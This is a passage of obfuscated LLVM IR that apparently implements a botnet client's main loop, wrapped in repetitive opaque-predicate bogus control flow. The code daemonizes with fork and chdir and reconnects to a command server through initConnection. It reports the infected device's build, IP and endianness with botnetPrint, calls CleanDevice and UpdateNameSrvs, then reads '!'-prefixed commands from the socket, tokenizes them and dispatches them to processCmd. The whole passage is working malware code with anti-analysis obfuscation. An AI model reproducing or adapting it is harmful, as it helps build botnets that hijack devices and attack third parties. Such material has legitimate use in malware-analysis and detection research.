  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %75, label %127, label %84

; <label>:84:                                     ; preds = %originalBBpart2
  %85 = load i32, i32* @x.111
  %86 = load i32, i32* @y.112
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %84
  %93 = call i32 @fork() #3
  store i32 %93, i32* %10, align 4
  %94 = icmp ne i32 %93, 0
  %95 = load i32, i32* @x.111
  %96 = load i32, i32* @y.112
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %94, label %103, label %120

; <label>:103:                                    ; preds = %originalBBpart24
  %104 = load i32, i32* @x.111
  %105 = load i32, i32* @y.112
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %103
  call void @exit(i32 0) #11
  %112 = load i32, i32* @x.111
  %113 = load i32, i32* @y.112
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  unreachable

; <label>:120:                                    ; preds = %originalBBpart24
  %121 = load i32, i32* %10, align 4
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %124, label %123

; <label>:123:                                    ; preds = %120
  br label %125

; <label>:124:                                    ; preds = %120
  br label %125

; <label>:125:                                    ; preds = %124, %123
  br label %126

; <label>:126:                                    ; preds = %125
  br label %144

; <label>:127:                                    ; preds = %originalBBpart2
  %128 = load i32, i32* @x.111
  %129 = load i32, i32* @y.112
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %127
  %136 = load i32, i32* @x.111
  %137 = load i32, i32* @y.112
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %144

; <label>:144:                                    ; preds = %originalBBpart212, %126
  br label %145

; <label>:145:                                    ; preds = %144
  %146 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.145, i32 0, i32 0)) #3
  %147 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  br label %148

; <label>:148:                                    ; preds = %691, %151, %145
  %149 = call i32 @initConnection()
  %150 = icmp ne i32 %149, 0
  br i1 %150, label %151, label %152

; <label>:151:                                    ; preds = %148
  br label %148

; <label>:152:                                    ; preds = %148
  %153 = load i32, i32* @x.111
  %154 = load i32, i32* @y.112
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %152
  %161 = load i32, i32* @KadenCommStock, align 4
  %162 = call i8* @getBuild()
  %163 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %164 = call i8* @inet_ntoa(i32 %163) #3
  %165 = call i32 @getEndianness()
  %166 = call i8* @getBuildz()
  %167 = call i32 (i32, i8*, ...) @botnetPrint(i32 %161, i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.146, i32 0, i32 0), i8* %162, i8* %164, i32 %165, i8* %166)
  call void @CleanDevice()
  call void @UpdateNameSrvs()
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  %168 = load i32, i32* @x.111
  %169 = load i32, i32* @y.112
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %176

; <label>:176:                                    ; preds = %690, %433, %originalBBpart216
  %177 = load i32, i32* @KadenCommStock, align 4
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  %179 = call i32 @recvLine(i32 %177, i8* %178, i32 4096)
  store i32 %179, i32* %13, align 4
  %180 = icmp ne i32 %179, -1
  br i1 %180, label %181, label %691

; <label>:181:                                    ; preds = %176
  %182 = load i32, i32* @x.111
  %183 = load i32, i32* @y.112
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %181
  store i32 0, i32* %14, align 4
  %190 = load i32, i32* @x.111
  %191 = load i32, i32* @y.112
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %198

; <label>:198:                                    ; preds = %originalBBpart252, %originalBBpart220
  %199 = load i32, i32* %14, align 4
  %200 = sext i32 %199 to i64
  %201 = load i64, i64* @numpids, align 8
  %202 = icmp ult i64 %200, %201
  br i1 %202, label %203, label %336

; <label>:203:                                    ; preds = %198
  %204 = load i32*, i32** @pids, align 8
  %205 = load i32, i32* %14, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds i32, i32* %204, i64 %206
  %208 = load i32, i32* %207, align 4
  %209 = call i32 @waitpid(i32 %208, i32* null, i32 1)
  %210 = icmp sgt i32 %209, 0
  br i1 %210, label %211, label %316

; <label>:211:                                    ; preds = %203
  %212 = load i32, i32* @x.111
  %213 = load i32, i32* @y.112
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %211
  %220 = load i32, i32* %14, align 4
  %221 = add nsw i32 %220, 1
  store i32 %221, i32* %16, align 4
  %222 = load i32, i32* @x.111
  %223 = load i32, i32* @y.112
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %230

; <label>:230:                                    ; preds = %262, %originalBBpart224
  %231 = load i32, i32* %16, align 4
  %232 = zext i32 %231 to i64
  %233 = load i64, i64* @numpids, align 8
  %234 = icmp ult i64 %232, %233
  br i1 %234, label %235, label %265

; <label>:235:                                    ; preds = %230
  %236 = load i32, i32* @x.111
  %237 = load i32, i32* @y.112
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %235
  %244 = load i32*, i32** @pids, align 8
  %245 = load i32, i32* %16, align 4
  %246 = zext i32 %245 to i64
  %247 = getelementptr inbounds i32, i32* %244, i64 %246
  %248 = load i32, i32* %247, align 4
  %249 = load i32*, i32** @pids, align 8
  %250 = load i32, i32* %16, align 4
  %251 = sub i32 %250, 1
  %252 = zext i32 %251 to i64
  %253 = getelementptr inbounds i32, i32* %249, i64 %252
  store i32 %248, i32* %253, align 4
  %254 = load i32, i32* @x.111
  %255 = load i32, i32* @y.112
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart231, label %originalBB26alteredBB

originalBBpart231:                                ; preds = %originalBB26
  br label %262

; <label>:262:                                    ; preds = %originalBBpart231
  %263 = load i32, i32* %16, align 4
  %264 = add i32 %263, 1
  store i32 %264, i32* %16, align 4
  br label %230

; <label>:265:                                    ; preds = %230
  %266 = load i32*, i32** @pids, align 8
  %267 = load i32, i32* %16, align 4
  %268 = sub i32 %267, 1
  %269 = zext i32 %268 to i64
  %270 = getelementptr inbounds i32, i32* %266, i64 %269
  store i32 0, i32* %270, align 4
  %271 = load i64, i64* @numpids, align 8
  %272 = add i64 %271, -1
  store i64 %272, i64* @numpids, align 8
  %273 = load i64, i64* @numpids, align 8
  %274 = add i64 %273, 1
  %275 = mul i64 %274, 4
  %276 = call noalias i8* @malloc(i64 %275) #3
  %277 = bitcast i8* %276 to i32*
  store i32* %277, i32** %15, align 8
  store i32 0, i32* %16, align 4
  br label %278

; <label>:278:                                    ; preds = %originalBBpart242, %265
  %279 = load i32, i32* %16, align 4
  %280 = zext i32 %279 to i64
  %281 = load i64, i64* @numpids, align 8
  %282 = icmp ult i64 %280, %281
  br i1 %282, label %283, label %312

; <label>:283:                                    ; preds = %278
  %284 = load i32*, i32** @pids, align 8
  %285 = load i32, i32* %16, align 4
  %286 = zext i32 %285 to i64
  %287 = getelementptr inbounds i32, i32* %284, i64 %286
  %288 = load i32, i32* %287, align 4
  %289 = load i32*, i32** %15, align 8
  %290 = load i32, i32* %16, align 4
  %291 = zext i32 %290 to i64
  %292 = getelementptr inbounds i32, i32* %289, i64 %291
  store i32 %288, i32* %292, align 4
  br label %293

; <label>:293:                                    ; preds = %283
  %294 = load i32, i32* @x.111
  %295 = load i32, i32* @y.112
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %293
  %302 = load i32, i32* %16, align 4
  %303 = add i32 %302, 1
  store i32 %303, i32* %16, align 4
  %304 = load i32, i32* @x.111
  %305 = load i32, i32* @y.112
  %306 = sub i32 %304, 1
  %307 = mul i32 %304, %306
  %308 = urem i32 %307, 2
  %309 = icmp eq i32 %308, 0
  %310 = icmp slt i32 %305, 10
  %311 = or i1 %309, %310
  br i1 %311, label %originalBBpart242, label %originalBB33alteredBB

originalBBpart242:                                ; preds = %originalBB33
  br label %278

; <label>:312:                                    ; preds = %278
  %313 = load i32*, i32** @pids, align 8
  %314 = bitcast i32* %313 to i8*
  call void @free(i8* %314) #3
  %315 = load i32*, i32** %15, align 8
  store i32* %315, i32** @pids, align 8
  br label %316

; <label>:316:                                    ; preds = %312, %203
  br label %317

; <label>:317:                                    ; preds = %316
  %318 = load i32, i32* @x.111
  %319 = load i32, i32* @y.112
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %317
  %326 = load i32, i32* %14, align 4
  %327 = add nsw i32 %326, 1
  store i32 %327, i32* %14, align 4
  %328 = load i32, i32* @x.111
  %329 = load i32, i32* @y.112
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBBpart252, label %originalBB44alteredBB

originalBBpart252:                                ; preds = %originalBB44
  br label %198

; <label>:336:                                    ; preds = %198
  %337 = load i32, i32* @x.111
  %338 = load i32, i32* @y.112
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %336
  %345 = load i32, i32* %13, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 %346
  store i8 0, i8* %347, align 1
  %348 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  call void @trim(i8* %348)
  %349 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  store i8* %349, i8** %17, align 8
  %350 = load i8*, i8** %17, align 8
  %351 = load i8, i8* %350, align 1
  %352 = zext i8 %351 to i32
  %353 = icmp eq i32 %352, 33
  %354 = load i32, i32* @x.111
  %355 = load i32, i32* @y.112
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %353, label %362, label %690

; <label>:362:                                    ; preds = %originalBBpart256
  %363 = load i32, i32* @x.111
  %364 = load i32, i32* @y.112
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %362
  %371 = load i8*, i8** %17, align 8
  %372 = getelementptr inbounds i8, i8* %371, i64 1
  store i8* %372, i8** %18, align 8
  %373 = load i32, i32* @x.111
  %374 = load i32, i32* @y.112
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %381

; <label>:381:                                    ; preds = %originalBBpart268, %originalBBpart260
  %382 = load i32, i32* @x.111
  %383 = load i32, i32* @y.112
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %381
  %390 = load i8*, i8** %18, align 8
  %391 = load i8, i8* %390, align 1
  %392 = zext i8 %391 to i32
  %393 = icmp ne i32 %392, 32
  %394 = load i32, i32* @x.111
  %395 = load i32, i32* @y.112
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %393, label %402, label %407

; <label>:402:                                    ; preds = %originalBBpart264
  %403 = load i8*, i8** %18, align 8
  %404 = load i8, i8* %403, align 1
  %405 = zext i8 %404 to i32
  %406 = icmp ne i32 %405, 0
  br label %407

; <label>:407:                                    ; preds = %402, %originalBBpart264
  %408 = phi i1 [ false, %originalBBpart264 ], [ %406, %402 ]
  br i1 %408, label %409, label %428

; <label>:409:                                    ; preds = %407
  %410 = load i32, i32* @x.111
  %411 = load i32, i32* @y.112
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %409
  %418 = load i8*, i8** %18, align 8
  %419 = getelementptr inbounds i8, i8* %418, i32 1
  store i8* %419, i8** %18, align 8
  %420 = load i32, i32* @x.111
  %421 = load i32, i32* @y.112
  %422 = sub i32 %420, 1
  %423 = mul i32 %420, %422
  %424 = urem i32 %423, 2
  %425 = icmp eq i32 %424, 0
  %426 = icmp slt i32 %421, 10
  %427 = or i1 %425, %426
  br i1 %427, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %381

; <label>:428:                                    ; preds = %407
  %429 = load i8*, i8** %18, align 8
  %430 = load i8, i8* %429, align 1
  %431 = zext i8 %430 to i32
  %432 = icmp eq i32 %431, 0
  br i1 %432, label %433, label %434

; <label>:433:                                    ; preds = %428
  br label %176

; <label>:434:                                    ; preds = %428
  %435 = load i32, i32* @x.111
  %436 = load i32, i32* @y.112
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %434
  %443 = load i8*, i8** %18, align 8
  store i8 0, i8* %443, align 1
  %444 = load i8*, i8** %17, align 8
  %445 = getelementptr inbounds i8, i8* %444, i64 1
  store i8* %445, i8** %18, align 8
  %446 = load i8*, i8** %17, align 8
  %447 = load i8*, i8** %18, align 8
  %448 = call i64 @strlen(i8* %447) #9
  %449 = getelementptr inbounds i8, i8* %446, i64 %448
  %450 = getelementptr inbounds i8, i8* %449, i64 2
  store i8* %450, i8** %17, align 8
  %451 = load i32, i32* @x.111
  %452 = load i32, i32* @y.112
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %459

; <label>:459:                                    ; preds = %479, %originalBBpart272
  %460 = load i8*, i8** %17, align 8
  %461 = load i8*, i8** %17, align 8
  %462 = call i64 @strlen(i8* %461) #9
  %463 = sub i64 %462, 1
  %464 = getelementptr inbounds i8, i8* %460, i64 %463
  %465 = load i8, i8* %464, align 1
  %466 = zext i8 %465 to i32
  %467 = icmp eq i32 %466, 10
  br i1 %467, label %477, label %468

; <label>:468:                                    ; preds = %459
  %469 = load i8*, i8** %17, align 8
  %470 = load i8*, i8** %17, align 8
  %471 = call i64 @strlen(i8* %470) #9
  %472 = sub i64 %471, 1
  %473 = getelementptr inbounds i8, i8* %469, i64 %472
  %474 = load i8, i8* %473, align 1
  %475 = zext i8 %474 to i32
  %476 = icmp eq i32 %475, 13
  br label %477

; <label>:477:                                    ; preds = %468, %459
  %478 = phi i1 [ true, %459 ], [ %476, %468 ]
  br i1 %478, label %479, label %485

; <label>:479:                                    ; preds = %477
  %480 = load i8*, i8** %17, align 8
  %481 = load i8*, i8** %17, align 8
  %482 = call i64 @strlen(i8* %481) #9
  %483 = sub i64 %482, 1
  %484 = getelementptr inbounds i8, i8* %480, i64 %483
  store i8 0, i8* %484, align 1
  br label %459

; <label>:485:                                    ; preds = %477
  %486 = load i32, i32* @x.111
  %487 = load i32, i32* @y.112
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %485
  %494 = load i8*, i8** %17, align 8
  store i8* %494, i8** %19, align 8
  %495 = load i32, i32* @x.111
  %496 = load i32, i32* @y.112
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %503

; <label>:503:                                    ; preds = %547, %originalBBpart276
  %504 = load i8*, i8** %17, align 8
  %505 = load i8, i8* %504, align 1
  %506 = zext i8 %505 to i32
  %507 = icmp ne i32 %506, 32
  br i1 %507, label %508, label %529

; <label>:508:                                    ; preds = %503
  %509 = load i32, i32* @x.111
  %510 = load i32, i32* @y.112
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %508
  %517 = load i8*, i8** %17, align 8
  %518 = load i8, i8* %517, align 1
  %519 = zext i8 %518 to i32
  %520 = icmp ne i32 %519, 0
  %521 = load i32, i32* @x.111
  %522 = load i32, i32* @y.112
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %529

; <label>:529:                                    ; preds = %originalBBpart280, %503
  %530 = phi i1 [ false, %503 ], [ %520, %originalBBpart280 ]
  %531 = load i32, i32* @x.111
  %532 = load i32, i32* @y.112
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %529
  %539 = load i32, i32* @x.111
  %540 = load i32, i32* @y.112
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %530, label %547, label %550

; <label>:547:                                    ; preds = %originalBBpart284
  %548 = load i8*, i8** %17, align 8
  %549 = getelementptr inbounds i8, i8* %548, i32 1
  store i8* %549, i8** %17, align 8
  br label %503

; <label>:550:                                    ; preds = %originalBBpart284
  %551 = load i8*, i8** %17, align 8
  store i8 0, i8* %551, align 1
  %552 = load i8*, i8** %17, align 8
  %553 = getelementptr inbounds i8, i8* %552, i32 1
  store i8* %553, i8** %17, align 8
  %554 = load i8*, i8** %19, align 8
  store i8* %554, i8** %20, align 8
  br label %555

; <label>:555:                                    ; preds = %originalBBpart288, %550
  %556 = load i8*, i8** %20, align 8
  %557 = load i8, i8* %556, align 1
  %558 = icmp ne i8 %557, 0
  br i1 %558, label %559, label %584

; <label>:559:                                    ; preds = %555
  %560 = load i32, i32* @x.111
  %561 = load i32, i32* @y.112
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
  br i1 %567, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %559
  %568 = load i8*, i8** %20, align 8
  %569 = load i8, i8* %568, align 1
  %570 = zext i8 %569 to i32
  %571 = call i32 @toupper(i32 %570) #9
  %572 = trunc i32 %571 to i8
  %573 = load i8*, i8** %20, align 8
  store i8 %572, i8* %573, align 1
  %574 = load i8*, i8** %20, align 8
  %575 = getelementptr inbounds i8, i8* %574, i32 1
  store i8* %575, i8** %20, align 8
  %576 = load i32, i32* @x.111
  %577 = load i32, i32* @y.112
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %555

; <label>:584:                                    ; preds = %555
  store i32 1, i32* %22, align 4
  %585 = load i8*, i8** %17, align 8
  %586 = call i8* @strtok(i8* %585, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0)) #3
  store i8* %586, i8** %23, align 8
  %587 = load i8*, i8** %19, align 8
  %588 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %587, i8** %588, align 16
  br label %589

; <label>:589:                                    ; preds = %620, %584
  %590 = load i8*, i8** %23, align 8
  %591 = icmp ne i8* %590, null
  br i1 %591, label %592, label %622

; <label>:592:                                    ; preds = %589
  %593 = load i8*, i8** %23, align 8
  %594 = load i8, i8* %593, align 1
  %595 = zext i8 %594 to i32
  %596 = icmp ne i32 %595, 10
  br i1 %596, label %597, label %620

; <label>:597:                                    ; preds = %592
  %598 = load i8*, i8** %23, align 8
  %599 = call i64 @strlen(i8* %598) #9
  %600 = add i64 %599, 1
  %601 = call noalias i8* @malloc(i64 %600) #3
  %602 = load i32, i32* %22, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %603
  store i8* %601, i8** %604, align 8
  %605 = load i32, i32* %22, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %606
  %608 = load i8*, i8** %607, align 8
  %609 = load i8*, i8** %23, align 8
  %610 = call i64 @strlen(i8* %609) #9
  %611 = add i64 %610, 1
  call void @llvm.memset.p0i8.i64(i8* %608, i8 0, i64 %611, i32 1, i1 false)
  %612 = load i32, i32* %22, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %613
  %615 = load i8*, i8** %614, align 8
  %616 = load i8*, i8** %23, align 8
  %617 = call i8* @strcpy(i8* %615, i8* %616) #3
  %618 = load i32, i32* %22, align 4
  %619 = add nsw i32 %618, 1
  store i32 %619, i32* %22, align 4
  br label %620

; <label>:620:                                    ; preds = %597, %592
  %621 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0)) #3
  store i8* %621, i8** %23, align 8
  br label %589

; <label>:622:                                    ; preds = %589
  %623 = load i32, i32* @x.111
  %624 = load i32, i32* @y.112
  %625 = sub i32 %623, 1
  %626 = mul i32 %623, %625
  %627 = urem i32 %626, 2
  %628 = icmp eq i32 %627, 0
  %629 = icmp slt i32 %624, 10
  %630 = or i1 %628, %629
  br i1 %630, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %622
  %631 = load i32, i32* %22, align 4
  %632 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %631, i8** %632)
  %633 = load i32, i32* %22, align 4
  %634 = icmp sgt i32 %633, 1
  %635 = load i32, i32* @x.111
  %636 = load i32, i32* @y.112
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %634, label %643, label %673

; <label>:643:                                    ; preds = %originalBBpart292
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %644

; <label>:644:                                    ; preds = %originalBBpart2103, %643
  %645 = load i32, i32* %24, align 4
  %646 = load i32, i32* %22, align 4
  %647 = icmp slt i32 %645, %646
  br i1 %647, label %648, label %672

; <label>:648:                                    ; preds = %644
  %649 = load i32, i32* %24, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %650
  %652 = load i8*, i8** %651, align 8
  call void @free(i8* %652) #3
  br label %653

; <label>:653:                                    ; preds = %648
  %654 = load i32, i32* @x.111
  %655 = load i32, i32* @y.112
  %656 = sub i32 %654, 1
  %657 = mul i32 %654, %656
  %658 = urem i32 %657, 2
  %659 = icmp eq i32 %658, 0
  %660 = icmp slt i32 %655, 10
  %661 = or i1 %659, %660
  br i1 %661, label %originalBB94, label %originalBB94alteredBB

